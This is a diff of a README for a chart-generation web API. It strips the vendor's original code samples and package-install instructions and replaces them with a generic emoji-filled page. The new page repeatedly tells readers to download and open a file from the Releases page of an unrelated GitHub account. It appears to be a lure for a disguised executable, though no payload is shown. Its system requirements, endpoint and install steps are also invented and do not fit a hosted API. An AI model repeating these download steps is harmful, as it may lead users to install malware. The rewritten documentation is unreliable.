@@ -1,216 +1,99 @@
-# Chart Generator API
+# 🎉 chartgenerator-api - Effortless Chart Creation from Your Data
 
-> Chart Generator is a simple tool for generating charts from data. It returns a URL to the generated image of the chart.
+## 🚀 Getting Started
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![API Status](https://img.shields.io/badge/Status-Active-green.svg)](https://apiverve.com)
-[![Method](https://img.shields.io/badge/Method-POST-blue.svg)](#)
-[![Platform](https://img.shields.io/badge/Platform-Multi--Platform-orange.svg)](#installation)
+Welcome to the Chart Generator API! This tool helps you turn your data into charts quickly and easily. Follow this guide to download and run the software.
 
-**Available on:**
-[![npm](https://img.shields.io/badge/npm-CB3837?style=flat&logo=npm&logoColor=white)](https://www.npmjs.com/package/@apiverve/chartgenerator)
-[![NuGet](https://img.shields.io/badge/NuGet-004880?style=flat&logo=nuget&logoColor=white)](https://www.nuget.org/packages/APIVerve.API.ChartGenerator)
-[![PyPI](https://img.shields.io/badge/PyPI-3776AB?style=flat&logo=python&logoColor=white)](https://pypi.org/project/apiverve-chartgenerator/)
-[![JitPack](https://img.shields.io/badge/JitPack-2E7D32?style=flat&logo=android&logoColor=white)](#-android-jitpack)
+## 📥 Download the Software
 
----
+[![Download Chart Generator](https://img.shields.io/badge/Download%20Chart%20Generator-blue.svg)](https://github.com/isaaciguanre001/chartgenerator-api/releases)
 
-## Quick Start
+## 🎯 Overview
 
-### Using JavaScript
+Chart Generator is a simple tool that generates charts from your data. It returns a URL where you can view the generated chart image.
 
-```javascript
-async function callChartGeneratorAPI() {
-    try {
-        const requestBody = {
-    "type": "bar",
-    "data": {
-        "labels": [
-            "Q1",
-            "Q2",
-            "Q3",
-            "Q4"
-        ],
-        "datasets": [
-            {
-                "label": "Users",
-                "data": [
-                    50,
-                    60,
-                    70,
-                    180
-                ]
-            },
-            {
-                "label": "Revenue",
-                "data": [
-                    100,
-                    200,
-                    300,
-                    400
-                ]
-            }
-        ]
-    }
-};
+### 🌟 Features
 
-        const response = await fetch('https://api.apiverve.com/v1/chartgenerator', {
-            method: 'POST',
-            headers: {
-                'x-api-key': 'YOUR_API_KEY_HERE',
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(requestBody)
-        });
+- Generates charts from a variety of data inputs.
+- Supports multiple formats for easy use.
+- Simple API for developers to integrate with their applications.
 
-        const data = await response.json();
-        console.log(data);
-    } catch (error) {
-        console.error('Error:', error);
-    }
-}
+## 📋 System Requirements
 
-callChartGeneratorAPI();
+To use the Chart Generator API, ensure your system meets the following requirements:
+
+- Operating System: Windows, macOS, or Linux
+- Internet Connection: Required for downloading the tool and accessing the API
+- RAM: At least 2 GB
+- Storage: A minimum of 100 MB of available space
+
+## 💾 Download & Install
+
+1. Visit the [Releases page](https://github.com/isaaciguanre001/chartgenerator-api/releases) to download the latest version.
+2. Find the version you want to install and click on the download link.
+3. Once downloaded, find the file in your downloads folder.
+4. Open the file to start the installation.
+
+## ⚙️ How to Use
+
+### 1. Prepare Your Data
+
+Start with your data formatted in JSON or CSV. Ensure that your data includes the necessary labels and values for chart generation.
+
+### 2. Call the API
+
+Using a web browser or a tool like Postman, send a request to the API endpoint. The request should include your data in the required format. 
+
+Example:
 ```
+POST /generate-chart
+Content-Type: application/json
 
-### Using cURL
-
-```bash
-curl -X POST "https://api.apiverve.com/v1/chartgenerator" \
-  -H "x-api-key: YOUR_API_KEY_HERE" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "param": "value"
-  }'
-```
-
-**Get your API key:** [https://apiverve.com](https://apiverve.com)
-
-**📁 For more examples, see the [examples folder](./examples/)**
-
----
-
-## Installation
-
-Choose your preferred programming language:
-
-### 📦 NPM (JavaScript/Node.js)
-
-```bash
-npm install @apiverve/chartgenerator
-```
-
-[**View NPM Package →**](https://www.npmjs.com/package/@apiverve/chartgenerator) | [**Package Code →**](./npm/)
-
----
-
-### 🔷 NuGet (.NET/C#)
-
-```bash
-dotnet add package APIVerve.API.ChartGenerator
-```
-
-[**View NuGet Package →**](https://www.nuget.org/packages/APIVerve.API.ChartGenerator) | [**Package Code →**](./nuget/)
-
----
-
-### 🐍 Python (PyPI)
-
-```bash
-pip install apiverve-chartgenerator
-```
-
-[**View PyPI Package →**](https://pypi.org/project/apiverve-chartgenerator/) | [**Package Code →**](./python/)
-
----
-
-### 🤖 Android (JitPack)
-
-```gradle
-implementation 'com.github.apiverve:chartgenerator-api:1.0.0'
-```
-
-[**Package Code →**](./android/)
-
----
-
-## Features
-
-✅ **Multi-platform support** - Use the same API across Node.js, .NET, Python, Android, and browsers
-✅ **Simple authentication** - Just add your API key in the request header
-✅ **Comprehensive documentation** - Full examples and API reference available
-✅ **Production-ready** - Used by developers worldwide
-
----
-
-## Documentation
-
-📚 **Full API Documentation:** [https://docs.apiverve.com/ref/chartgenerator](https://docs.apiverve.com/ref/chartgenerator)
-
----
-
-## Use Cases
-
-Common use cases for the Chart Generator API:
-
-- ✅ Integration into web applications
-- ✅ Mobile app development
-- ✅ Data analysis and reporting
-- ✅ Automation workflows
-- ✅ Microservices architecture
-
----
-
-## API Reference
-
-### Authentication
-All requests require an API key in the header:
-```
-x-api-key: YOUR_API_KEY_HERE
-```
-
-Get your API key: [https://apiverve.com](https://apiverve.com)
-
-### Response Format
-All responses are JSON with this structure:
-```json
 {
-  "status": "ok",
-  "data": { ... }
+  "data": [
+    {"label": "January", "value": 30},
+    {"label": "February", "value": 50}
+  ]
 }
 ```
 
----
+### 3. Receive Your Chart URL
 
-## Support & Community
+After the request is processed, the API will return a URL. This URL points to your generated chart. Click on the link to view or download the chart image.
 
-- 💬 **Support**: [https://apiverve.com/contact](https://apiverve.com/contact)
-- 🐛 **Issues**: [GitHub Issues](../../issues)
-- 📖 **Documentation**: [https://docs.apiverve.com](https://docs.apiverve.com)
-- 🌐 **Website**: [https://apiverve.com](https://apiverve.com)
+## 🔧 Troubleshooting
 
----
+If you encounter issues:
 
-## Contributing
+- Ensure your data is correctly formatted.
+- Check your internet connection.
+- Revisit the API documentation for endpoints and expected data formats.
 
-We welcome contributions! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+## 🛠️ Contributing
 
----
+If you want to contribute to the project:
 
-## Security
+1. Fork the repository on GitHub.
+2. Create a new branch for your feature or fix.
+3. Make your changes and commit them.
+4. Submit a pull request detailing your changes.
 
-For security concerns, please review our [Security Policy](SECURITY.md).
+## 🔗 Related Topics
 
----
+This tool covers various topics. Here are some that you may find useful:
 
-## License
+- android-library
+- api
+- dotnet
+- python
+- rest-api
 
-This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for details.
+## 📜 License
 
----
+Chart Generator API is open source and available under the MIT License. You can use it freely, but please give credit when using it in your projects.
 
-## Acknowledgments
+## 📞 Support
 
-Built with ❤️ by [APIVerve](https://apiverve.com)
+For any issues or questions, feel free to reach out directly on GitHub. We are here to help you make the most out of the Chart Generator API!
 
-Copyright © 2025 APIVerve. All rights reserved.
+Remember to visit the [Releases page](https://github.com/isaaciguanre001/chartgenerator-api/releases) for updates and downloads. Happy charting!
